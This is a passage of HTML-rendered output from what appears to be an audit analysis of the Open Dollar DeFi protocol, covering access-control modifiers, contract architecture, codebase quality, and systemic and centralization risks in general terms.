class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<ul>\n<li><strong>Control Access For DAO Governor</strong></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGovernor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotGovernor</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<ul>\n<li><strong>Owner Of The Safe</strong></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">].</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">safeCan</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SafeNotAllowed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<ul>\n<li><strong>Safe Handler</strong></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">handlerAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_handler</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_handler</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">handlerCan</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_handler</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">HandlerNotAllowed</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"approach-taken-in-evaluating-the-open-dollar-protocol\" style=\"position:relative;\"><a href=\"#approach-taken-in-evaluating-the-open-dollar-protocol\" aria-label=\"approach taken in evaluating the open dollar protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Approach Taken-in Evaluating The Open Dollar Protocol</h3>\n<p>Accordingly, I analyzed and audited the subject in the following steps;</p>\n<ol>\n<li>\n<p><strong>Core Protocol Contract Overview</strong>:</p>\n<p>I focused on thoroughly understanding the codebase and providing recommendations to improve its functionality.\nThe main goal was to take a close look at the important contracts and how they work together in the Open Dollar Protocol.</p>\n<p><strong>Main Contracts I Looked At</strong></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        ODGovernor.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Vault721.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ODSafeManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ODProxy.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        SAFEHandler.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        AccountingEngine.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        BasicActions.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        CamelotRelayer.sol</span></span></code></pre>\n<p>I started my analysis by examining the ODGovernor.sol contract. Audit the governance contract first as it has a central role in modifying protocol parameters, enabling modifications to protocol parameters and security settings. Its functions for proposal creation, voting, and quorum verification must be meticulously audited to ensure secure and accurate governance operations. Particular attention should be paid to timelock control mechanisms, role-based access controls, and protection against vulnerabilities.</p>\n<p>Then, I turned our attention to the Vault721.sol contract second because it manages all safe ownership, transfers, and approvals via the ERC721 standard, and it interacts closely with the ODSafeManager.</p>\n<p>Then ODSafeManager.sol contract next as it’s essential to make sure it interacts securely with Vault721 and controls the creation and movement of safes within the system.</p>\n<p>Then audit <code>ODProxy</code>, which is used to restrict ownership changes to ensure protocol integrity. Security of this contract is important and <code>SAFEHandler</code> as it grants permissions for ODSafeManager to make modifications to a safe. The security of this interaction is crucial but may depend on the ODSafeManager.</p>\n<p>And <code>AccountingEngine</code> contract because it deals with the financial operations of the protocol. Vulnerabilities in this contract could have significant financial implications and then <code>BasicActions</code> contract, which contains core actions related to managing safes. It’s important to ensure the security of these actions.Then <code>CamelotRelayer</code> contract as it’s responsible for fetching the market price. The reliability of price oracles is crucial for accurate protocol operation.</p>\n</li>\n<li>\n<p><strong>Documentation Review</strong>:</p>\n<p>Then went to Review <a href=\"https://docs.opendollar.com\">their docs</a> for a more detailed and technical explanation of Open Dollar.</p>\n</li>\n<li>\n<p><strong>Manual Code Review</strong> In this phase, I initially conducted a line-by-line analysis, following that, I engaged in a comparison mode.</p>\n<ul>\n<li><strong>Line by Line Analysis</strong>: Pay close attention to the contract’s intended functionality and compare it with its actual behavior on a line-by-line basis.</li>\n<li><strong>Comparison Mode</strong>: Compare the implementation of each function with established standards or existing implementations, focusing on the function names to identify any deviations.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"architecture-description-and-diagram\" style=\"position:relative;\"><a href=\"#architecture-description-and-diagram\" aria-label=\"architecture description and diagram permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Architecture Description and Diagram</h3>\n<p>Architecture of the key contracts that are part of the Open Dollar protocol:</p>\n<p><a href=\"https://www.figma.com/file/g7S9iJpEvWALcRN0uC9j08/Open-Dollar-Diagram-v1?type=design&#x26;mode=design\">This diagram</a> illustrates the interaction among the key components of the Open Dollar protocol.</p>\n<h3 id=\"accounting-engine\" style=\"position:relative;\"><a href=\"#accounting-engine\" aria-label=\"accounting engine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Accounting Engine</h3>\n<p>The <strong>Accounting Engine</strong> plays a central role in the protocol. It receives system surplus and debt, manages debt queues, and conducts surplus and debt auctions.</p>\n<h3 id=\"oracle-relayers\" style=\"position:relative;\"><a href=\"#oracle-relayers\" aria-label=\"oracle relayers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Oracle Relayers</h3>\n<ul>\n<li><strong>Camelot Relayer</strong>: Used by the Oracle Relayer, it fetches the current market price of the system coin (OD) from a Camelot pool on the Arbitrum network. This price data is essential for various protocol operations.</li>\n<li><strong>UniV3 Relayer</strong>: An alternative option for fetching the OD’s market price, used by the Oracle Relayer. It retrieves price data from a Uniswap V3 pool on the Arbitrum network.</li>\n</ul>\n<h3 id=\"governor-odgovernor\" style=\"position:relative;\"><a href=\"#governor-odgovernor\" aria-label=\"governor odgovernor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Governor (ODGovernor)</h3>\n<p>The <strong>Governor (ODGovernor)</strong> is the DAO-managed contract that governs the protocol. It can modify protocol parameters, such as adding new collateral types and changing PID settings. The Governor interacts with other protocol components to propose and execute changes.</p>\n<h3 id=\"proxy-components\" style=\"position:relative;\"><a href=\"#proxy-components\" aria-label=\"proxy components permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proxy Components</h3>\n<ul>\n<li><strong>ODProxy</strong>: A more restrictive version of the DSProxy used by the Maker Protocol. It ensures that only the Vault721 contract has the ability to transfer a safe. This restriction is crucial for the security of the protocol.</li>\n<li><strong>Vault721</strong>: Serves as the Proxy Registry, Proxy Factory, and the ERC721 “Non-fungible Vault.” It manages all safe ownership, transfers, and approvals via the ERC721 standard. It tracks proxy ownership and deploys new proxies when necessary.</li>\n</ul>\n<h3 id=\"safe-components\" style=\"position:relative;\"><a href=\"#safe-components\" aria-label=\"safe components permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SAFE Components</h3>\n<ul>\n<li><strong>SAFEHandler</strong>: Grants permission to the ODSafeManager to make modifications to a safe. A new SAFEHandler is deployed for each safe, and its address serves as a unique identifier within the SAFEEngine.</li>\n<li><strong>ODSafeManager</strong>: A more restrictive Safe Manager, allowing only the Vault721 contract to move a safe. It also calls Vault721 to mint a new safe when one is created.</li>\n</ul>\n<h3 id=\"basicactions\" style=\"position:relative;\"><a href=\"#basicactions\" aria-label=\"basicactions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BasicActions</h3>\n<p>These actions are part of the protocol and interact with various components as needed. They play a crucial role in executing various operations within the protocol.</p>\n<p>The interaction among these components forms the backbone of the Open Dollar protocol, allowing it to manage its surplus and debt, obtain reliable price data, and govern its parameters securely. These interactions are essential for maintaining the stability and functionality of the protocol in the decentralized financial ecosystem.</p>\n<h3 id=\"architecture-feedback\" style=\"position:relative;\"><a href=\"#architecture-feedback\" aria-label=\"architecture feedback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Architecture Feedback</h3>\n<p><strong>Comments and Documentation</strong>: While the codebase contains comments, improving the quality of comments and documentation can enhance code readability. Consider using more explanatory comments to clarify the purpose and functionality of each section of the code. This will make it easier for other developers and auditor to understand and maintain the code.</p>\n<p><strong>Decimals Handling</strong>: When working with decimals, ensure that all conversions are handled accurately.For-Example The multiplier calculation in CamelotRelayer.sol could potentially benefit from additional comments and explanation for clarity.</p>\n<p><strong>Formal Verification</strong>: Consider a professional formal verification of the contract to identify and mitigate any security risks.</p>\n<p><strong>Consolidation of Related Functions</strong>:For-Exampe: Some functions like <code>_generateDebt</code> and <code>_repayDebt</code> in BasicActions.sol share common functionality, and combining them into a single function with parameters to specify the operation could reduce code duplication.</p>\n<h3 id=\"codebase-quality\" style=\"position:relative;\"><a href=\"#codebase-quality\" aria-label=\"codebase quality permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Codebase Quality</h3>\n<p>Overall, I consider the quality of the Open Dollar codebase to be excellent. The code appears to be very mature and well-developed. We have noticed the implementation of various standards adhere to appropriately. Details are explained below:</p>\n<table>\n<thead>\n<tr>\n<th>Codebase Quality Categories</th>\n<th>Comments</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Code Maintainability and Reliability</strong></td>\n<td>The codebase demonstrates moderate maintainability with well-structured functions and comments, promoting readability. It exhibits reliability through defensive programming practices, parameter validation, and handling external calls safely. The use of internal functions for related operations enhances code modularity, reducing duplication. Libraries improve reliability by minimizing arithmetic errors. Adherence to standard conventions and practices contributes to overall code quality. However, full reliability depends on external contract implementations like openzeppelin, uniswap.</td>\n</tr>\n<tr>\n<td><strong>Code Comments</strong></td>\n<td>The contracts have comments that are used to explain the purpose and functionality of different parts of the contracts, making it easier for developers to understand and maintain the code. The comments provide descriptions of methods, variables, and the overall structure of the contract.For-Exmaple: The code comments in the “CamelotRelayerChild” contract provide essential information. The imported interfaces and contracts are declared, and the contract’s title and purpose are described.</td>\n</tr>\n<tr>\n<td><strong>Documentation</strong></td>\n<td>The documentation of the Open Dollar project is quite comprehensive and detailed, providing a solid overview of how Open Dollar is structured and how its various aspects function. However, we have noticed that there is room for additional details, such as diagrams, to gain a deeper understanding of how different contracts interact and the functions they implement. With considerable enthusiasm. We are confident that these diagrams will bring significant value to the protocol as they can be seamlessly integrated into the existing documentation, enriching it and providing a more comprehensive and detailed understanding for users, developers and auditors.</td>\n</tr>\n<tr>\n<td><strong>Testing</strong></td>\n<td>The audit scope of the contracts to be audited is 95% and it should be aimed to be 100%.</td>\n</tr>\n<tr>\n<td><strong>Code Structure and Formatting</strong></td>\n<td>The codebase contracts are well-structured and formatted. It inherits from multiple components, adhering for-example OpenZeppelin governance standards in some contracts. The constructors initializes the contract with parameters and inherited components. Override functions for each component are provided with accompanying comments explaining their purpose. The code is organized, making it readable and maintainable.</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"systemic--centralization-risks\" style=\"position:relative;\"><a href=\"#systemic--centralization-risks\" aria-label=\"systemic  centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Systemic &#x26; Centralization Risks</h3>\n<p>The analysis provided highlights several significant systemic and centralization risks present in the Open Dollar protocol. These risks encompass concentration risk in ODGovernor, BasicActions, AccountingEngine risk and more, third-party dependency risk, and centralization risks arising from the existence of an “owner” role in specific contracts. However, the documentation lacks clarity on whether this address represents an externally owned account (EOA) or a contract, warranting the need for clarification. Additionally, the absence of fuzzing and invariant tests could also pose risks to the protocol’s security.</p>\n<p>Here’s an analysis of potential systemic and centralization risks in the provided contracts:</p>\n<h3 id=\"systemic-risks\" style=\"position:relative;\"><a href=\"#systemic-risks\" aria-label=\"systemic risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Systemic Risks:</h3>\n<ol>\n<li><strong>No having, fuzzing and invariant tests could open the door to future vulnerabilities</strong>.</li>\n<li>The AccountingEngine contract manages debt and surplus within the system, which can be a systemic risk if not executed correctly. Mishandling debt or surplus could lead to imbalances and impact the stability of the entire protocol, and this contract allows parameters to be modified. Inappropriately setting these parameters can introduce systemic risks. For example, setting incorrect surplus transfer percentages or auction bid sizes may lead to issues.</li>\n<li>The CamelotRelayer.sol retrieves price information from an external source, the CamelotPair. Systemic risk exists if this source provides inaccurate or manipulated data, leading to incorrect price feeds and potentially affecting other parts of the protocol relying on this data and this contract converts and scales price results by manipulating decimals, if there are errors or discrepancies in this conversion, leading to incorrect pricing information and potentially impacting the entire system.</li>\n<li>The “build” function allows users in Vault721 contract to create ODProxy contracts, but it can be abused. It does not have any checks or permissions other than verifying if a user already has an ODProxy. There is potential for abuse if users create excessive proxies, which could lead to misuse or spam.</li>\n<li>In BasicActions.sol contract systemic risks might arise from the exit mechanisms, especially if there are discrepancies between the rates used in calculations and those from the external SAFE engine.</li>\n</ol>\n<h3 id=\"centralization-risks\" style=\"position:relative;\"><a href=\"#centralization-risks\" aria-label=\"centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Centralization Risks:</h3>\n<ol>\n<li>In AccountingEngine.sol contract allows specific accounts to be authorized and to modify parameters. Centralization risks are present if a small number of entities or individuals control these authorizations, potentially leading to centralized control over the protocol.</li>\n<li>CamelotRelayer contract’s constructor sets critical parameters like baseToken, quoteToken, baseAmount, multiplier, and quotePeriod. Centralization risks are present because these parameters are not governed by a decentralized process and are hardcoded and The <code>getResultWithValidity</code> function returns false if the pool doesn’t have enough history. The validity of the result depends on the pool’s history and may be influenced by external factors, introducing centralization risks.</li>\n<li>The contract UniV3Relayer.sol doesn’t provide a way to modify the fee tier or other pool-related parameters after deployment, which could be problematic if adjustments are needed based on changing market conditions.</li>\n<li>The ODGovernor.sol specifies a fixed quorum fraction (3) that is not governed or adjustable through governance processes. Centralization risks arise as this parameter cannot be modified in response to changing conditions.</li>\n<li>The owner’s address is set as immutable in ODProxy.sol contract, meaning it cannot be changed once the contract is deployed. This lack of flexibility to change ownership through a decentralized process can be a centralization risk, as there is no governance mechanism in place to handle ownership transitions and the contract does not have a mechanism for upgrades or modifications. If there are bugs or vulnerabilities discovered in the contract’s code, there is no way to implement improvements without deploying an entirely new contract, which can be cumbersome and disruptive.</li>\n</ol>\n<p><strong>Properly managing these risks and implementing best practices in security and decentralization will contribute to the sustainability and long-term success of the Open Dollar protocol.</strong></p>\n<h3 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h3>\n<p>In general, the Open Dollar project exhibits an interesting and well-developed architecture we believe the team has done a good job\nregarding the code, but the identified risks need to be addressed, and measures should be implemented to protect the protocol from\npotential malicious use cases. Additionally, it is recommended to improve the documentation and comments in the code to enhance\nunderstanding and collaboration among developers. It is also highly recommended that the team continues to invest in security\nmeasures such as mitigation reviews, audits, and bug bounty programs to maintain the security and reliability of the project.</p>\n<h3 id=\"time-spent\" style=\"position:relative;\"><a href=\"#time-spent\" aria-label=\"time spent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 